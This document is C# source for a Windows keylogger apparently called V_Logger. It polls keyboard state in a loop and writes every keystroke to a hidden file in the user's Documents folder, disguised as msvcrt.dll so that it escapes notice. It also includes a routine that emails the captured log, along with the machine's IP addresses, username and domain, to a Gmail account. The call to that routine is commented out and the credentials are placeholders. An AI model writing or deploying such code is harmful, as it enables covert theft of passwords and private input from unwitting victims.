using System;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;

namespace V_Logger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        //counter for the keystrokes.
        static long numberOfKeystrokes = 0;

        static void Main(string[] args)
        {

            //capture keystrokes and display them to the console.

            //reaching folder Documents
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            //setting the filder and filename.
            string path = (filePath + @"\msvcrt.dll"); //saving strokes into a dll file it wont attach attention... maybe :)

            //check if the directory not exists, if not then create it.
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            //if the file not exists in the directory then create a new text file.
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) { };
                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden); //set the file attributte to hidden
            }


            while (true)
            {
                
                //pause and let other programs a chace to run.
                Thread.Sleep(5);

                //chack all keys fr their state.
                //using ascii here  (asciitable.com)  32 is space button, etc, etc...
                for (int i = 32; i <= 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    //if (keyState !=0)
                    //{
                    //    Console.Write(keyState + " | ");
                    //}

                    //store the log in textfile.
                    if (keyState == 32769)
                    {
                        Console.Write((char)i + ", ");

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        };
                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

                        //----------------------------------------------------------------------------------------//
                        //not used yet, just remove out comments if planed to use this function
                        //(before use, first set the mail addresses, credentials under sendMessage function)

                        //increment keystrokes
                        numberOfKeystrokes++;

                        //send every 100 char typed.
                        //if (numberOfKeystrokes % 100 == 0)
                        //{
                        //    sendMessage();
                        //}

                    }

                }


            }

        }

        //send the txt file content periodically via email.
        static void sendMessage()
        {
            //send the content of a text file to a mail address.
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            string filepath = folderName + @"\msvcrt.dll";

            string logContent = File.ReadAllText(filepath);


            //create an E-mail message. 
            DateTime Now = DateTime.Now; // get the exact datetime

            string mailBody = "";  //empty mail body
            string subject = "Message from V-Logger.";  //mail subject (title of the mail)

            var Host = Dns.GetHostEntry(Dns.GetHostName()); //get the hostnames

            foreach (var address in Host.AddressList) //list all ip adressess from the addresslist
            {
                mailBody += "Address:" + address; //attach them to a mailbody
            }
            mailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;  //attach domain name and username 
            mailBody += "\n Host" + Host;
            mailBody += "\n Time: " + Now.ToString(); //attach the time
            mailBody += logContent; //attach the logfile content

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); //smtp client and port
            MailMessage mailMessage = new MailMessage(); //create a new mail message

            mailMessage.From = new MailAddress("yourmail@gmail.com"); //mail from
            mailMessage.To.Add("somemail@gmail.com"); //mail to
            mailMessage.Subject = subject; //subject of the mail
            client.UseDefaultCredentials = false;
            client.EnableSsl = true; //use ssl encription
            client.Credentials = new NetworkCredential("yourmail@gmail.com", "YourPassword"); //your mail login credentials
            mailMessage.Body = mailBody; // the body of the mail

            client.Send(mailMessage);  //send the mail
        }
    }
}
